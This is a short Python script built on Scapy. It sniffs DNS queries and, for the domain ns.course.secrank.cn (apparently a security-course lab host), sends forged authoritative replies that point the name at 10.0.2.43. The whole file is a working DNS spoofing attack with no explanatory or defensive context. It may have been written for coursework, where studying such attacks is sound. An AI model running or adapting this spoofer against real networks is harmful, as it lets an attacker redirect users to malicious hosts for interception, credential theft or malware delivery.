from scapy.all import *


registers = {'ns.course.secrank.cn': '10.0.2.43'}


def prn(pkt):
    cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
    if cap_domain in registers:
        fakeResponse = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
            / UDP(dport=pkt[UDP].sport, sport=53)\
            / DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[cap_domain]))
        send(fakeResponse, verbose=0)


sniff(prn=prn, filter='udp dst port 53', store=0)
